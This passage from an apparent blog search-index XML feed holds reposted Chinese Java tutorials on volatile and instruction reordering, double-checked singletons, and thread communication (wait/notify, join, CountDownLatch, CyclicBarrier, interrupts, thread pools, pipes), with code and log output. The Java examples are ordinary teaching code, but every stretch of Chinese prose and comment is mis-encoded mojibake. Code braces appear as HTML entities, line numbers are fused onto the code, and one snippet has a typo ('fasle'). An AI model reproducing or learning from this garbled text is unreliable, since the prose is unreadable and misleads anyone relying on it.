æˆ–è€…æ˜¯é”çš„æ–¹å¼æ¥ä¿è¯åŸå­æ€§ã€‚ è¿˜å¯ä»¥ç”¨ Atomic åŒ…ä¸­ AtomicInteger æ¥æ›¿æ¢ intï¼Œå®ƒåˆ©ç”¨äº† CAS ç®—æ³•æ¥ä¿è¯äº†åŸå­æ€§ã€‚ æŒ‡ä»¤é‡æ’å†…å­˜å¯è§æ€§åªæ˜¯ volatile çš„å…¶ä¸­ä¸€ä¸ªè¯­ä¹‰ï¼Œå®ƒè¿˜å¯ä»¥é˜²æ­¢ JVM è¿›è¡ŒæŒ‡ä»¤é‡æ’ä¼˜åŒ–ã€‚ ä¸¾ä¸€ä¸ªä¼ªä»£ç : 123int a=10 ;//1int b=20 ;//2int c= a+b ;//3 ä¸€æ®µç‰¹åˆ«ç®€å•çš„ä»£ç ï¼Œç†æƒ³æƒ…å†µä¸‹å®ƒçš„æ‰§è¡Œé¡ºåºæ˜¯ï¼š1&gt;2&gt;3ã€‚ä½†æœ‰å¯èƒ½ç»è¿‡ JVM ä¼˜åŒ–ä¹‹åçš„æ‰§è¡Œé¡ºåºå˜ä¸ºäº† 2&gt;1&gt;3ã€‚ å¯ä»¥å‘ç°ä¸ç®¡ JVM æ€ä¹ˆä¼˜åŒ–ï¼Œå‰æéƒ½æ˜¯ä¿è¯å•çº¿ç¨‹ä¸­æœ€ç»ˆç»“æœä¸å˜çš„æƒ…å†µä¸‹è¿›è¡Œçš„ã€‚ å¯èƒ½è¿™é‡Œè¿˜çœ‹ä¸å‡ºæœ‰ä»€ä¹ˆé—®é¢˜ï¼Œé‚£çœ‹ä¸‹ä¸€æ®µä¼ªä»£ç : 12345678910111213141516171819private static Map&lt;String,String&gt; value ;private static volatile boolean flag = fasle ;//ä»¥ä¸‹æ–¹æ³•å‘ç”Ÿåœ¨çº¿ç¨‹ A ä¸­ åˆå§‹åŒ– Mappublic void initMap()&#123; //è€—æ—¶æ“ä½œ value = getMapValue() ;//1 flag = true ;//2&#125;//å‘ç”Ÿåœ¨çº¿ç¨‹ Bä¸­ ç­‰åˆ° Map åˆå§‹åŒ–æˆåŠŸè¿›è¡Œå…¶ä»–æ“ä½œpublic void doSomeThing()&#123; while(!flag)&#123; sleep() ; &#125; //dosomething doSomeThing(value);&#125; è¿™é‡Œå°±èƒ½çœ‹å‡ºé—®é¢˜äº†ï¼Œå½“ flag æ²¡æœ‰è¢« volatile ä¿®é¥°æ—¶ï¼ŒJVM å¯¹ 1 å’Œ 2 è¿›è¡Œé‡æ’ï¼Œå¯¼è‡´ value éƒ½è¿˜æ²¡æœ‰è¢«åˆå§‹åŒ–å°±æœ‰å¯èƒ½è¢«çº¿ç¨‹ B ä½¿ç”¨äº†ã€‚ æ‰€ä»¥åŠ ä¸Š volatile ä¹‹åå¯ä»¥é˜²æ­¢è¿™æ ·çš„é‡æ’ä¼˜åŒ–ï¼Œä¿è¯ä¸šåŠ¡çš„æ­£ç¡®æ€§ã€‚ æŒ‡ä»¤é‡æ’çš„çš„åº”ç”¨ä¸€ä¸ªç»å…¸çš„ä½¿ç”¨åœºæ™¯å°±æ˜¯åŒé‡æ‡’åŠ è½½çš„å•ä¾‹æ¨¡å¼äº†: 12345678910111213141516171819public class Singleton &#123; private static volatile Singleton singleton; private Singleton() &#123; &#125; public static Singleton getInstance() &#123; if (singleton == null) &#123; synchronized (Singleton.class) &#123; if (singleton == null) &#123; //é˜²æ­¢æŒ‡ä»¤é‡æ’ singleton = new Singleton(); &#125; &#125; &#125; return singleton; &#125;&#125; è¿™é‡Œçš„ volatile å…³é”®å­—ä¸»è¦æ˜¯ä¸ºäº†é˜²æ­¢æŒ‡ä»¤é‡æ’ã€‚ å¦‚æœä¸ç”¨ ï¼Œsingleton = new Singleton();ï¼Œè¿™æ®µä»£ç å…¶å®æ˜¯åˆ†ä¸ºä¸‰æ­¥ï¼š åˆ†é…å†…å­˜ç©ºé—´ã€‚(1) åˆå§‹åŒ–å¯¹è±¡ã€‚(2) å°† singleton å¯¹è±¡æŒ‡å‘åˆ†é…çš„å†…å­˜åœ°å€ã€‚(3) åŠ ä¸Š volatile æ˜¯ä¸ºäº†è®©ä»¥ä¸Šçš„ä¸‰æ­¥æ“ä½œé¡ºåºæ‰§è¡Œï¼Œåä¹‹æœ‰å¯èƒ½ç¬¬äºŒæ­¥åœ¨ç¬¬ä¸‰æ­¥ä¹‹å‰è¢«æ‰§è¡Œå°±æœ‰å¯èƒ½æŸä¸ªçº¿ç¨‹æ‹¿åˆ°çš„å•ä¾‹å¯¹è±¡æ˜¯è¿˜æ²¡æœ‰åˆå§‹åŒ–çš„ï¼Œä»¥è‡´äºæŠ¥é”™ã€‚ æ€»ç»“volatile åœ¨ Java å¹¶å‘ä¸­ç”¨çš„å¾ˆå¤šï¼Œæ¯”å¦‚åƒ Atomic åŒ…ä¸­çš„ valueã€ä»¥åŠ AbstractQueuedLongSynchronizer ä¸­çš„ state éƒ½æ˜¯è¢«å®šä¹‰ä¸º volatile æ¥ç”¨äºä¿è¯å†…å­˜å¯è§æ€§ã€‚ å°†è¿™å—ç†è§£é€å½»å¯¹æˆ‘ä»¬ç¼–å†™å¹¶å‘ç¨‹åºæ—¶å¯ä»¥æä¾›å¾ˆå¤§å¸®åŠ©ã€‚]]></content>
      <categories>
        <category>Github</category>
        <category>Java-Interview</category>
      </categories>
      <tags>
        <tag>æŠ€æœ¯</tag>
        <tag>Java</tag>
        <tag>è½¬è½½</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[thread-communication]]></title>
    <url>%2F2018%2F06%2F30%2FJava%2FInterview%2FJava-Interview%2Fconcurrent%2Fthread-communication%2F</url>
    <content type="text"><![CDATA[æ·±å…¥ç†è§£çº¿ç¨‹é€šä¿¡å‰è¨€å¼€å‘ä¸­ä¸å…ä¼šé‡åˆ°éœ€è¦æ‰€æœ‰å­çº¿ç¨‹æ‰§è¡Œå®Œæ¯•é€šçŸ¥ä¸»çº¿ç¨‹å¤„ç†æŸäº›é€»è¾‘çš„åœºæ™¯ã€‚ æˆ–è€…æ˜¯çº¿ç¨‹ A åœ¨æ‰§è¡Œåˆ°æŸä¸ªæ¡ä»¶é€šçŸ¥çº¿ç¨‹ B æ‰§è¡ŒæŸä¸ªæ“ä½œã€‚ å¯ä»¥é€šè¿‡ä»¥ä¸‹å‡ ç§æ–¹å¼å®ç°ï¼š ç­‰å¾…é€šçŸ¥æœºåˆ¶ ç­‰å¾…é€šçŸ¥æ¨¡å¼æ˜¯ Java ä¸­æ¯”è¾ƒç»å…¸çš„çº¿ç¨‹é€šä¿¡æ–¹å¼ã€‚ ä¸¤ä¸ªçº¿ç¨‹é€šè¿‡å¯¹åŒä¸€å¯¹è±¡è°ƒç”¨ç­‰å¾… wait() å’Œé€šçŸ¥ notify() æ–¹æ³•æ¥è¿›è¡Œé€šè®¯ã€‚ å¦‚ä¸¤ä¸ªçº¿ç¨‹äº¤æ›¿æ‰“å°å¥‡å¶æ•°ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091public class TwoThreadWaitNotify &#123; private int start = 1; private boolean flag = false; public static void main(String[] args) &#123; TwoThreadWaitNotify twoThread = new TwoThreadWaitNotify(); Thread t1 = new Thread(new OuNum(twoThread)); t1.setName("A"); Thread t2 = new Thread(new JiNum(twoThread)); t2.setName("B"); t1.start(); t2.start(); &#125; /** * å¶æ•°çº¿ç¨‹ */ public static class OuNum implements Runnable &#123; private TwoThreadWaitNotify number; public OuNum(TwoThreadWaitNotify number) &#123; this.number = number; &#125; @Override public void run() &#123; while (number.start &lt;= 100) &#123; synchronized (TwoThreadWaitNotify.class) &#123; System.out.println("å¶æ•°çº¿ç¨‹æŠ¢åˆ°é”äº†"); if (number.flag) &#123; System.out.println(Thread.currentThread().getName() + "+-+å¶æ•°" + number.start); number.start++; number.flag = false; TwoThreadWaitNotify.class.notify(); &#125;else &#123; try &#123; TwoThreadWaitNotify.class.wait(); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; &#125; &#125; &#125; &#125; /** * å¥‡æ•°çº¿ç¨‹ */ public static class JiNum implements Runnable &#123; private TwoThreadWaitNotify number; public JiNum(TwoThreadWaitNotify number) &#123; this.number = number; &#125; @Override public void run() &#123; while (number.start &lt;= 100) &#123; synchronized (TwoThreadWaitNotify.class) &#123; System.out.println("å¥‡æ•°çº¿ç¨‹æŠ¢åˆ°é”äº†"); if (!number.flag) &#123; System.out.println(Thread.currentThread().getName() + "+-+å¥‡æ•°" + number.start); number.start++; number.flag = true; TwoThreadWaitNotify.class.notify(); &#125;else &#123; try &#123; TwoThreadWaitNotify.class.wait(); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; &#125; &#125; &#125; &#125;&#125; è¾“å‡ºç»“æœï¼š 12345678t2+-+å¥‡æ•°93t1+-+å¶æ•°94t2+-+å¥‡æ•°95t1+-+å¶æ•°96t2+-+å¥‡æ•°97t1+-+å¶æ•°98t2+-+å¥‡æ•°99t1+-+å¶æ•°100 è¿™é‡Œçš„çº¿ç¨‹ A å’Œçº¿ç¨‹ B éƒ½å¯¹åŒä¸€ä¸ªå¯¹è±¡ TwoThreadWaitNotify.class è·å–é”ï¼ŒA çº¿ç¨‹è°ƒç”¨äº†åŒæ­¥å¯¹è±¡çš„ wait() æ–¹æ³•é‡Šæ”¾äº†é”å¹¶è¿›å…¥ WAITING çŠ¶æ€ã€‚ B çº¿ç¨‹è°ƒç”¨äº† notify() æ–¹æ³•ï¼Œè¿™æ · A çº¿ç¨‹æ”¶åˆ°é€šçŸ¥ä¹‹åå°±å¯ä»¥ä» wait() æ–¹æ³•ä¸­è¿”å›ã€‚ è¿™é‡Œåˆ©ç”¨äº† TwoThreadWaitNotify.class å¯¹è±¡å®Œæˆäº†é€šä¿¡ã€‚ æœ‰ä¸€äº›éœ€è¦æ³¨æ„: wait() ã€nofify() ã€nofityAll() è°ƒç”¨çš„å‰æéƒ½æ˜¯è·å¾—äº†å¯¹è±¡çš„é”(ä¹Ÿå¯ç§°ä¸ºå¯¹è±¡ç›‘è§†å™¨)ã€‚ è°ƒç”¨ wait() æ–¹æ³•åçº¿ç¨‹ä¼šé‡Šæ”¾é”ï¼Œè¿›å…¥ WAITING çŠ¶æ€ï¼Œè¯¥çº¿ç¨‹ä¹Ÿä¼šè¢«ç§»åŠ¨åˆ°ç­‰å¾…é˜Ÿåˆ—ä¸­ã€‚ è°ƒç”¨ notify() æ–¹æ³•ä¼šå°†ç­‰å¾…é˜Ÿåˆ—ä¸­çš„çº¿ç¨‹ç§»åŠ¨åˆ°åŒæ­¥é˜Ÿåˆ—ä¸­ï¼Œçº¿ç¨‹çŠ¶æ€ä¹Ÿä¼šæ›´æ–°ä¸º BLOCKED ä» wait() æ–¹æ³•è¿”å›çš„å‰ææ˜¯è°ƒç”¨ notify() æ–¹æ³•çš„çº¿ç¨‹é‡Šæ”¾é”ï¼Œwait() æ–¹æ³•çš„çº¿ç¨‹è·å¾—é”ã€‚ ç­‰å¾…é€šçŸ¥æœ‰ç€ä¸€ä¸ªç»å…¸èŒƒå¼ï¼š çº¿ç¨‹ A ä½œä¸ºæ¶ˆè´¹è€…ï¼š è·å–å¯¹è±¡çš„é”ã€‚ è¿›å…¥ while(åˆ¤æ–­æ¡ä»¶)ï¼Œå¹¶è°ƒç”¨ wait() æ–¹æ³•ã€‚ å½“æ¡ä»¶æ»¡è¶³è·³å‡ºå¾ªç¯æ‰§è¡Œå…·ä½“å¤„ç†é€»è¾‘ã€‚ çº¿ç¨‹ B ä½œä¸ºç”Ÿäº§è€…: è·å–å¯¹è±¡é”ã€‚ æ›´æ”¹ä¸çº¿ç¨‹ A å…±ç”¨çš„åˆ¤æ–­æ¡ä»¶ã€‚ è°ƒç”¨ notify() æ–¹æ³•ã€‚ ä¼ªä»£ç å¦‚ä¸‹: 1234567891011121314//Thread Asynchronized(Object)&#123; while(æ¡ä»¶)&#123; Object.wait(); &#125; //do something&#125;//Thread Bsynchronized(Object)&#123; æ¡ä»¶=false;//æ”¹å˜æ¡ä»¶ Object.notify();&#125; join() æ–¹æ³•1234567891011121314151617181920212223242526272829303132333435private static void join() throws InterruptedException &#123; Thread t1 = new Thread(new Runnable() &#123; @Override public void run() &#123; LOGGER.info("running"); try &#123; Thread.sleep(3000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; &#125;) ; Thread t2 = new Thread(new Runnable() &#123; @Override public void run() &#123; LOGGER.info("running2"); try &#123; Thread.sleep(4000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; &#125;) ; t1.start(); t2.start(); //ç­‰å¾…çº¿ç¨‹1ç»ˆæ­¢ t1.join(); //ç­‰å¾…çº¿ç¨‹2ç»ˆæ­¢ t2.join(); LOGGER.info("main over");&#125; è¾“å‡ºç»“æœ: 1232018-03-16 20:21:30.967 [Thread-1] INFO c.c.actual.ThreadCommunication - running22018-03-16 20:21:30.967 [Thread-0] INFO c.c.actual.ThreadCommunication - running2018-03-16 20:21:34.972 [main] INFO c.c.actual.ThreadCommunication - main over åœ¨ t1.join() æ—¶ä¼šä¸€ç›´é˜»å¡åˆ° t1 æ‰§è¡Œå®Œæ¯•ï¼Œæ‰€ä»¥æœ€ç»ˆä¸»çº¿ç¨‹ä¼šç­‰å¾… t1 å’Œ t2 çº¿ç¨‹æ‰§è¡Œå®Œæ¯•ã€‚ å…¶å®ä»æºç å¯ä»¥çœ‹å‡ºï¼Œjoin() ä¹Ÿæ˜¯åˆ©ç”¨çš„ç­‰å¾…é€šçŸ¥æœºåˆ¶ï¼š æ ¸å¿ƒé€»è¾‘: 123while (isAlive()) &#123; wait(0);&#125; åœ¨ join çº¿ç¨‹å®Œæˆåä¼šè°ƒç”¨ notifyAll() æ–¹æ³•ï¼Œæ˜¯åœ¨ JVM å®ç°ä¸­è°ƒç”¨ï¼Œæ‰€ä»¥è¿™é‡Œçœ‹ä¸å‡ºæ¥ã€‚ volatile å…±äº«å†…å­˜å› ä¸º Java æ˜¯é‡‡ç”¨å…±äº«å†…å­˜çš„æ–¹å¼è¿›è¡Œçº¿ç¨‹é€šä¿¡çš„ï¼Œæ‰€ä»¥å¯ä»¥é‡‡ç”¨ä»¥ä¸‹æ–¹å¼ç”¨ä¸»çº¿ç¨‹å…³é—­ A çº¿ç¨‹: 1234567891011121314151617181920212223242526272829public class Volatile implements Runnable&#123; private static volatile boolean flag = true ; @Override public void run() &#123; while (flag)&#123; System.out.println(Thread.currentThread().getName() + "æ­£åœ¨è¿è¡Œã€‚ã€‚ã€‚"); &#125; System.out.println(Thread.currentThread().getName() +"æ‰§è¡Œå®Œæ¯•"); &#125; public static void main(String[] args) throws InterruptedException &#123; Volatile aVolatile = new Volatile(); new Thread(aVolatile,"thread A").start(); System.out.println("main çº¿ç¨‹æ­£åœ¨è¿è¡Œ") ; TimeUnit.MILLISECONDS.sleep(100) ; aVolatile.stopThread(); &#125; private void stopThread()&#123; flag = false ; &#125;&#125; è¾“å‡ºç»“æœï¼š12345thread Aæ­£åœ¨è¿è¡Œã€‚ã€‚ã€‚thread Aæ­£åœ¨è¿è¡Œã€‚ã€‚ã€‚thread Aæ­£åœ¨è¿è¡Œã€‚ã€‚ã€‚thread Aæ­£åœ¨è¿è¡Œã€‚ã€‚ã€‚thread Aæ‰§è¡Œå®Œæ¯• è¿™é‡Œçš„ flag å­˜æ”¾äºä¸»å†…å­˜ä¸­ï¼Œæ‰€ä»¥ä¸»çº¿ç¨‹å’Œçº¿ç¨‹ A éƒ½å¯ä»¥çœ‹åˆ°ã€‚ flag é‡‡ç”¨ volatile ä¿®é¥°ä¸»è¦æ˜¯ä¸ºäº†å†…å­˜å¯è§æ€§ï¼Œæ›´å¤šå†…å®¹å¯ä»¥æŸ¥çœ‹è¿™é‡Œã€‚ CountDownLatch å¹¶å‘å·¥å…·CountDownLatch å¯ä»¥å®ç° join ç›¸åŒçš„åŠŸèƒ½ï¼Œä½†æ˜¯æ›´åŠ çš„çµæ´»ã€‚ 12345678910111213141516171819202122232425private static void countDownLatch() throws Exception&#123; int thread = 3 ; long start = System.currentTimeMillis(); final CountDownLatch countDown = new CountDownLatch(thread); for (int i= 0 ;i&lt;thread ; i++)&#123; new Thread(new Runnable() &#123; @Override public void run() &#123; LOGGER.info("thread run"); try &#123; Thread.sleep(2000); countDown.countDown(); LOGGER.info("thread end"); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; &#125;).start(); &#125; countDown.await(); long stop = System.currentTimeMillis(); LOGGER.info("main over total time=&#123;&#125;",stop-start);&#125; è¾“å‡ºç»“æœ: 12345672018-03-16 20:19:44.126 [Thread-0] INFO c.c.actual.ThreadCommunication - thread run2018-03-16 20:19:44.126 [Thread-2] INFO c.c.actual.ThreadCommunication - thread run2018-03-16 20:19:44.126 [Thread-1] INFO c.c.actual.ThreadCommunication - thread run2018-03-16 20:19:46.136 [Thread-2] INFO c.c.actual.ThreadCommunication - thread end2018-03-16 20:19:46.136 [Thread-1] INFO c.c.actual.ThreadCommunication - thread end2018-03-16 20:19:46.136 [Thread-0] INFO c.c.actual.ThreadCommunication - thread end2018-03-16 20:19:46.136 [main] INFO c.c.actual.ThreadCommunication - main over total time=2012 CountDownLatch ä¹Ÿæ˜¯åŸºäº AQS(AbstractQueuedSynchronizer) å®ç°çš„ï¼Œæ›´å¤šå®ç°å‚è€ƒ ReentrantLock å®ç°åŸç† åˆå§‹åŒ–ä¸€ä¸ª CountDownLatch æ—¶å‘Šè¯‰å¹¶å‘çš„çº¿ç¨‹ï¼Œç„¶ååœ¨æ¯ä¸ªçº¿ç¨‹å¤„ç†å®Œæ¯•ä¹‹åè°ƒç”¨ countDown() æ–¹æ³•ã€‚ è¯¥æ–¹æ³•ä¼šå°† AQS å†…ç½®çš„ä¸€ä¸ª state çŠ¶æ€ -1 ã€‚ æœ€ç»ˆåœ¨ä¸»çº¿ç¨‹è°ƒç”¨ await() æ–¹æ³•ï¼Œå®ƒä¼šé˜»å¡ç›´åˆ° state == 0 çš„æ—¶å€™è¿”å›ã€‚ CyclicBarrier å¹¶å‘å·¥å…·123456789101112131415161718192021222324252627282930313233343536373839404142434445464748private static void cyclicBarrier() throws Exception &#123; CyclicBarrier cyclicBarrier = new CyclicBarrier(3) ; new Thread(new Runnable() &#123; @Override public void run() &#123; LOGGER.info("thread run"); try &#123; cyclicBarrier.await() ; &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; LOGGER.info("thread end do something"); &#125; &#125;).start(); new Thread(new Runnable() &#123; @Override public void run() &#123; LOGGER.info("thread run"); try &#123; cyclicBarrier.await() ; &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; LOGGER.info("thread end do something"); &#125; &#125;).start(); new Thread(new Runnable() &#123; @Override public void run() &#123; LOGGER.info("thread run"); try &#123; Thread.sleep(5000); cyclicBarrier.await() ; &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; LOGGER.info("thread end do something"); &#125; &#125;).start(); LOGGER.info("main thread");&#125; CyclicBarrier ä¸­æ–‡åå«åšå±éšœæˆ–è€…æ˜¯æ …æ ï¼Œä¹Ÿå¯ä»¥ç”¨äºçº¿ç¨‹é—´é€šä¿¡ã€‚ å®ƒå¯ä»¥ç­‰å¾… N ä¸ªçº¿ç¨‹éƒ½è¾¾åˆ°æŸä¸ªçŠ¶æ€åç»§ç»­è¿è¡Œçš„æ•ˆæœã€‚ é¦–å…ˆåˆå§‹åŒ–çº¿ç¨‹å‚ä¸è€…ã€‚ è°ƒç”¨ await() å°†ä¼šåœ¨æ‰€æœ‰å‚ä¸è€…çº¿ç¨‹éƒ½è°ƒç”¨ä¹‹å‰ç­‰å¾…ã€‚ ç›´åˆ°æ‰€æœ‰å‚ä¸è€…éƒ½è°ƒç”¨äº† await() åï¼Œæ‰€æœ‰çº¿ç¨‹ä» await() è¿”å›ç»§ç»­åç»­é€»è¾‘ã€‚ è¿è¡Œç»“æœ: 12345672018-03-18 22:40:00.731 [Thread-0] INFO c.c.actual.ThreadCommunication - thread run2018-03-18 22:40:00.731 [Thread-1] INFO c.c.actual.ThreadCommunication - thread run2018-03-18 22:40:00.731 [Thread-2] INFO c.c.actual.ThreadCommunication - thread run2018-03-18 22:40:00.731 [main] INFO c.c.actual.ThreadCommunication - main thread2018-03-18 22:40:05.741 [Thread-0] INFO c.c.actual.ThreadCommunication - thread end do something2018-03-18 22:40:05.741 [Thread-1] INFO c.c.actual.ThreadCommunication - thread end do something2018-03-18 22:40:05.741 [Thread-2] INFO c.c.actual.ThreadCommunication - thread end do something å¯ä»¥çœ‹å‡ºç”±äºå…¶ä¸­ä¸€ä¸ªçº¿ç¨‹ä¼‘çœ äº†äº”ç§’ï¼Œæ‰€æœ‰å…¶ä½™æ‰€æœ‰çš„çº¿ç¨‹éƒ½å¾—ç­‰å¾…è¿™ä¸ªçº¿ç¨‹è°ƒç”¨ await() ã€‚ è¯¥å·¥å…·å¯ä»¥å®ç° CountDownLatch åŒæ ·çš„åŠŸèƒ½ï¼Œä½†æ˜¯è¦æ›´åŠ çµæ´»ã€‚ç”šè‡³å¯ä»¥è°ƒç”¨ reset() æ–¹æ³•é‡ç½® CyclicBarrier (éœ€è¦è‡ªè¡Œæ•è· BrokenBarrierException å¤„ç†) ç„¶åé‡æ–°æ‰§è¡Œã€‚ çº¿ç¨‹å“åº”ä¸­æ–­12345678910111213141516171819202122232425public class StopThread implements Runnable &#123; @Override public void run() &#123; while ( !Thread.currentThread().isInterrupted()) &#123; // çº¿ç¨‹æ‰§è¡Œå…·ä½“é€»è¾‘ System.out.println(Thread.currentThread().getName() + "è¿è¡Œä¸­ã€‚ã€‚"); &#125; System.out.println(Thread.currentThread().getName() + "é€€å‡ºã€‚ã€‚"); &#125; public static void main(String[] args) throws InterruptedException &#123; Thread thread = new Thread(new StopThread(), "thread A"); thread.start(); System.out.println("main çº¿ç¨‹æ­£åœ¨è¿è¡Œ") ; TimeUnit.MILLISECONDS.sleep(10) ; thread.interrupt(); &#125;&#125; è¾“å‡ºç»“æœ: 123thread Aè¿è¡Œä¸­ã€‚ã€‚thread Aè¿è¡Œä¸­ã€‚ã€‚thread Aé€€å‡ºã€‚ã€‚ å¯ä»¥é‡‡ç”¨ä¸­æ–­çº¿ç¨‹çš„æ–¹å¼æ¥é€šä¿¡ï¼Œè°ƒç”¨äº† thread.interrupt() æ–¹æ³•å…¶å®å°±æ˜¯å°† thread ä¸­çš„ä¸€ä¸ªæ ‡å¿—å±æ€§ç½®ä¸ºäº† trueã€‚ å¹¶ä¸æ˜¯è¯´è°ƒç”¨äº†è¯¥æ–¹æ³•å°±å¯ä»¥ä¸­æ–­çº¿ç¨‹ï¼Œå¦‚æœä¸å¯¹è¿™ä¸ªæ ‡å¿—è¿›è¡Œå“åº”å…¶å®æ˜¯æ²¡æœ‰ä»€ä¹ˆä½œç”¨(è¿™é‡Œå¯¹è¿™ä¸ªæ ‡å¿—è¿›è¡Œäº†åˆ¤æ–­)ã€‚ ä½†æ˜¯å¦‚æœæŠ›å‡ºäº† InterruptedException å¼‚å¸¸ï¼Œè¯¥æ ‡å¿—å°±ä¼šè¢« JVM é‡ç½®ä¸º falseã€‚ çº¿ç¨‹æ±  awaitTermination() æ–¹æ³•å¦‚æœæ˜¯ç”¨çº¿ç¨‹æ± æ¥ç®¡ç†çº¿ç¨‹ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹å¼æ¥è®©ä¸»çº¿ç¨‹ç­‰å¾…çº¿ç¨‹æ± ä¸­æ‰€æœ‰ä»»åŠ¡æ‰§è¡Œå®Œæ¯•: 1234567891011121314151617181920212223242526272829303132private static void executorService() throws Exception&#123; BlockingQueue&lt;Runnable&gt; queue = new LinkedBlockingQueue&lt;&gt;(10) ; ThreadPoolExecutor poolExecutor = new ThreadPoolExecutor(5,5,1, TimeUnit.MILLISECONDS,queue) ; poolExecutor.execute(new Runnable() &#123; @Override public void run() &#123; LOGGER.info("running"); try &#123; Thread.sleep(3000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; &#125;); poolExecutor.execute(new Runnable() &#123; @Override public void run() &#123; LOGGER.info("running2"); try &#123; Thread.sleep(2000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; &#125;); poolExecutor.shutdown(); while (!poolExecutor.awaitTermination(1,TimeUnit.SECONDS))&#123; LOGGER.info("çº¿ç¨‹è¿˜åœ¨æ‰§è¡Œã€‚ã€‚ã€‚"); &#125; LOGGER.info("main over");&#125; è¾“å‡ºç»“æœ: 123452018-03-16 20:18:01.273 [pool-1-thread-2] INFO c.c.actual.ThreadCommunication - running22018-03-16 20:18:01.273 [pool-1-thread-1] INFO c.c.actual.ThreadCommunication - running2018-03-16 20:18:02.273 [main] INFO c.c.actual.ThreadCommunication - çº¿ç¨‹è¿˜åœ¨æ‰§è¡Œã€‚ã€‚ã€‚2018-03-16 20:18:03.278 [main] INFO c.c.actual.ThreadCommunication - çº¿ç¨‹è¿˜åœ¨æ‰§è¡Œã€‚ã€‚ã€‚2018-03-16 20:18:04.278 [main] INFO c.c.actual.ThreadCommunication - main over ä½¿ç”¨è¿™ä¸ª awaitTermination() æ–¹æ³•çš„å‰æéœ€è¦å…³é—­çº¿ç¨‹æ± ï¼Œå¦‚è°ƒç”¨äº† shutdown() æ–¹æ³•ã€‚ è°ƒç”¨äº† shutdown() ä¹‹åçº¿ç¨‹æ± ä¼šåœæ­¢æ¥å—æ–°ä»»åŠ¡ï¼Œå¹¶ä¸”ä¼šå¹³æ»‘çš„å…³é—­çº¿ç¨‹æ± ä¸­ç°æœ‰çš„ä»»åŠ¡ã€‚ ç®¡é“é€šä¿¡12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849public static void piped() throws IOException &#123; //é¢å‘äºå­—ç¬¦ PipedInputStream é¢å‘äºå­—èŠ‚ PipedWriter writer = new PipedWriter(); PipedReader reader = new PipedReader(); //è¾“å…¥è¾“å‡ºæµå»ºç«‹è¿æ¥ writer.connect(reader); Thread t1 = new Thread(new Runnable() &#123; @Override public void run() &#123; LOGGER.info("running"); try &#123; for (int i = 0; i &lt; 10; i++) &#123; writer.write(i+""); Thread.sleep(10); &#125; &#125; catch (Exception e) &#123; &#125; finally &#123; try &#123; writer.close(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; &#125; &#125;); Thread t2 = new Thread(new Runnable() &#123; @Override public void run() &#123; LOGGER.info("running2"); int msg = 0; try &#123; while ((msg = reader.read()) != -1) &#123; LOGGER.info("msg=&#123;&#125;", (char) msg); &#125; &#125; catch (Exception e) &#123; &#125; &#125; &#125;); t1.start(); t2.start();&#125; è¾“å‡ºç»“æœ: 1234567891011122018-03-16 19:56:43.014 [Thread-0] INFO c.c.actual.ThreadCommunication - running2018-03-16 19:56:43.014 [Thread-1] INFO c.c.actual.ThreadCommunication - running22018-03-16 19:56:43.130 [Thread-1] INFO c.c.actual.ThreadCommunication - msg=02018-03-16 19:56:43.132 [Thread-1] INFO c.c.actual.ThreadCommunication - msg=12018-03-16 19:56:43.132 [Thread-1] INFO c.c.actual.ThreadCommunication - msg=22018-03-16 19:56:43.133 [Thread-1] INFO c.c.actual.ThreadCommunication - msg=32018-03-16 19:56:43.133 [Thread-1] INFO c.c.actual.ThreadCommunication - msg=42018-03-16 19:56:43.133 [Thread-1] INFO c.c.actual.ThreadCommunication - msg=52018-03-16 19:56:43.133 [Thread-1] INFO c.c.actual.ThreadCommunication - msg=62018-03-16 19:56:43.134 [Thread-1] INFO c.c.actual.ThreadCommunication - msg=72018-03-16 19:56:43.134 [Thread-1] INFO c.c.actual.ThreadCommunication - msg=82018-03-16 19:56:43.134 [Thread-1] INFO c.c.actual.ThreadCommunication - msg=9 Java è™½è¯´æ˜¯åŸºäºå†…å­˜é€šä¿¡çš„ï¼Œä½†ä¹Ÿå¯ä»¥ä½¿ç”¨ç®¡é“é€šä¿¡ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¾“å…¥æµå’Œè¾“å‡ºæµéœ€è¦é¦–å…ˆå»ºç«‹è¿æ¥ã€‚è¿™æ ·çº¿ç¨‹ B å°±å¯ä»¥æ”¶åˆ°çº¿ç¨‹ A å‘å‡ºçš„æ¶ˆæ¯äº†ã€‚ å®é™…å¼€å‘ä¸­å¯ä»¥çµæ´»æ ¹æ®éœ€æ±‚é€‰æ‹©æœ€é€‚åˆçš„çº¿ç¨‹é€šä¿¡æ–¹å¼ã€‚]]></content>
      <categories>
        <category>Github</category>
        <category>Java-Interview</category>
      </categories>
      <tags>
        <tag>æŠ€æœ¯</tag>
        <tag>Java</tag>
        <tag>è½¬è½½</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ThreadPoolExecutor]]></title>
    <url>%2F2018%2F06%2F30%2FJava%2FInterview%2FJava-Interview%2FThreadPoolExecutor%2F</url>
